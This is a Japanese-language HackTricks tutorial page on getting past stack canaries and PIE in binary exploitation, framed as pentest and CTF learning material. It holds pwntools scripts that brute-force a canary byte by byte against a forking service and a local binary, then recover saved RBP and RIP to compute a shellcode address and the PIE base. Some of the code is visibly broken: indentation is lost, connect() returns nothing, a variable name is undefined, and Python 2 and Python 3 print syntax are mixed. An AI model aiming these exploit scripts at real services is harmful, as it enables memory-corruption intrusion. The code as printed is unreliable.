<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。

- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。

- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **ハッキングのトリックを共有するには、[hacktricks repo](https://github.com/carlospolop/hacktricks)と[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>


**もし、キャナリーとPIE（Position Independent Executable）で保護されたバイナリに直面している場合、それらをバイパスする方法を見つける必要があるでしょう。**

![](<../../.gitbook/assets/image (144).png>)

{% hint style="info" %}
**`checksec`**は、バイナリがキャナリーで保護されていることを見つけることができない場合があります。これは、静的にコンパイルされ、関数を識別することができない場合です。\
ただし、関数呼び出しの最初にスタックに値が保存され、この値が終了前にチェックされる場合、手動でこれを確認することができます。
{% endhint %}

# キャナリーのブルートフォース

単純なキャナリーをバイパスする最良の方法は、バイナリが**新しい接続を確立するたびに子プロセスをフォークするプログラム**である場合です（ネットワークサービス）。なぜなら、接続するたびに**同じキャナリーが使用される**からです。

そのため、キャナリーをバイパスする最良の方法は、単に**1文字ずつキャナリーをブルートフォースする**ことです。推測されたキャナリーバイトが正しいかどうかは、プログラムがクラッシュしたか、通常のフローを続けたかどうかで確認できます。この例では、関数は**8バイトのキャナリー（x64）**をブルートフォースし、正しく推測されたバイトと誤ったバイトを**サーバーからの応答**の有無で区別します（他の状況では**try/except**を使用する方法もあります）：

## 例1

この例は64ビット用に実装されていますが、32ビット用に簡単に実装することもできます。
```python
from pwn import *

def connect():
r = remote("localhost", 8788)

def get_bf(base):
canary = ""
guess = 0x0
base += canary

while len(canary) < 8:
while guess != 0xff:
r = connect()

r.recvuntil("Username: ")
r.send(base + chr(guess))

if "SOME OUTPUT" in r.clean():
print "Guessed correct byte:", format(guess, '02x')
canary += chr(guess)
base += chr(guess)
guess = 0x0
r.close()
break
else:
guess += 1
r.close()

print "FOUND:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in canary)
return base

canary_offset = 1176
base = "A" * canary_offset
print("Brute-Forcing canary")
base_canary = get_bf(base) #Get yunk data + canary
CANARY = u64(base_can[len(base_canary)-8:]) #Get the canary
```
## 例2

これは32ビット用に実装されていますが、簡単に64ビットに変更できます。\
また、この例では**プログラムが最初に入力のサイズを示すバイトを期待している**ことに注意してください。
```python
from pwn import *

# Here is the function to brute force the canary
def breakCanary():
known_canary = b""
test_canary = 0x0
len_bytes_to_read = 0x21

for j in range(0, 4):
# Iterate up to 0xff times to brute force all posible values for byte
for test_canary in range(0xff):
print(f"\rTrying canary: {known_canary} {test_canary.to_bytes(1, 'little')}", end="")

# Send the current input size
target.send(len_bytes_to_read.to_bytes(1, "little"))

# Send this iterations canary
target.send(b"0"*0x20 + known_canary + test_canary.to_bytes(1, "little"))

# Scan in the output, determine if we have a correct value
output = target.recvuntil(b"exit.")
if b"YUM" in output:
# If we have a correct value, record the canary value, reset the canary value, and move on
print(" - next byte is: " + hex(test_canary))
known_canary = known_canary + test_canary.to_bytes(1, "little")
len_bytes_to_read += 1
break

# Return the canary
return known_canary

# Start the target process
target = process('./feedme')
#gdb.attach(target)

# Brute force the canary
canary = breakCanary()
log.info(f"The canary is: {canary}")
```
# キャナリーの表示

キャナリーをバイパスする別の方法は、**表示する**ことです。\
スタックオーバーフローに対して脆弱なプログラムが、**スタックオーバーフローの一部を指す**`puts`関数を実行できる状況を想像してみてください。攻撃者は、キャナリーの**最初のバイトがヌルバイト**（`\x00`）であり、残りのキャナリーが**ランダムなバイト**であることを知っています。その後、攻撃者は、オーバーフローを作成して、**キャナリーの最初のバイトだけが残るようにスタックを上書き**することができます。\
次に、攻撃者は、ペイロードの中間部分で**puts機能を呼び出し**、キャナリーの**すべてを表示**します（最初のヌルバイトを除く）。\
この情報を使用して、攻撃者はキャナリーを知り、（同じプログラムセッション内で）新しい攻撃を作成して送信することができます。

もちろん、この戦術は非常に**制限されています**。攻撃者は、自分のペイロードの**内容を表示**してキャナリーを**外部に漏洩**し、その後、新しいペイロードを作成して（**同じプログラムセッション**内で）**実際のバッファオーバーフロー**を送信できる必要があります。\
CTFの例：[https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)

# PIE

PIEをバイパスするためには、いくつかのアドレスを**漏洩**する必要があります。バイナリがアドレスを漏洩していない場合、脆弱な関数のスタックに保存された**RBPとRIPをブルートフォース**するのが最善です。\
例えば、キャナリーとPIEの両方を使用してバイナリを保護している場合、キャナリーをブルートフォースし、次の8バイト（x64）が保存された**RBP**であり、次の8バイトが保存された**RIP**であることがわかります。

バイナリからRBPとRIPをブルートフォースするためには、プログラムが何かを出力するか、クラッシュしない場合に、有効な推測されたバイトが正しいことがわかります。キャナリーのブルートフォースに使用されるのと同じ関数を使用して、RBPとRIPをブルートフォースすることができます：
```python
print("Brute-Forcing RBP")
base_canary_rbp = get_bf(base_canary)
RBP = u64(base_canary_rbp[len(base_canary_rbp)-8:])
print("Brute-Forcing RIP")
base_canary_rbp_rip = get_bf(base_canary_rbp)
RIP = u64(base_canary_rbp_rip[len(base_canary_rbp_rip)-8:])
```
## ベースアドレスの取得

PIEを打破するために必要な最後のステップは、漏洩したアドレスから有用なアドレスを計算することです。具体的には、**RBP**と**RIP**です。

**RBP**からは、スタック内にシェルを書き込む場所を計算することができます。これは、スタック内に文字列"/bin/sh\x00"を書き込む場所を知るために非常に役立ちます。漏洩したRBPとシェルコードの間の距離を計算するには、**RBPを漏洩させた後にブレークポイントを設定**し、**シェルコードの位置を確認**してから、シェルコードとRBPの間の距離を計算することができます。
```python
INI_SHELLCODE = RBP - 1152
```
**RIP**からは、**PIEバイナリのベースアドレス**を計算することができます。これは、**有効なROPチェーン**を作成するために必要なものです。
ベースアドレスを計算するには、単に`objdump -d vunbinary`を実行し、最新のアドレスを逆アセンブルして確認します。

![](<../../.gitbook/assets/image (145).png>)

この例では、すべてのコードを特定するために**1バイトと半分だけが必要**であることがわかります。したがって、この状況ではベースアドレスは**漏洩したRIPが"000"で終わる**ことになります。例えば、もし _0x562002970**ecf**_ が漏洩した場合、ベースアドレスは _0x562002970**000**_ です。
```python
elf.address = RIP - (RIP & 0xfff)
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクション

- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう

- **[💬](https://emojipedia.org/speech-balloon/) Discordグループ**に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私を**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>
